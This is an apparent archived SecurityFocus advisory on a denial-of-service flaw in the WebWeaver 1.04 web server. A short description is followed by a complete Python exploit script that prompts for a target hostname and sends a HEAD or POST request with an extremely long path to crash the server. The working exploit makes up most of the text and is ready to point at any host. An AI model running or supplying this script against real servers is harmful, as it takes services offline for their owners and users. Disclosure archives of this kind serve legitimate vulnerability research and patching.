source: http://www.securityfocus.com/bid/7695/info

When WebWeaver receives unusually long POST or HEAD requests, a denial of service condition may result. Restarting WebWeaver will allow normal operation to resume.

This vulnerability was reported for WebWeaver 1.04. Earlier versions may also be vulnerable. 

}------- start of fadvWWhtdos.py ---------------{

#! /usr/bin/env python
###
# WebWeaver 1.04 Http Server DoS exploit
# by euronymous /f0kp [http://f0kp.iplus.ru]
########
# Usage: ./fadvWWhtdos.py
########

import sys
import httplib

met = raw_input("""
What kind request you want make to crash webweaver?? [ HEAD/POST ]:
""")
target = raw_input("Type your target hostname [ w/o http:// ]: ")
spl = "f0kp"*0x1FEF
conn = httplib.HTTPConnection(target)
conn.request(met, "/"+spl)
r1 = conn.getresponse()
print r1.status

}--------- end of fadvWWhtdos.py ---------------{ 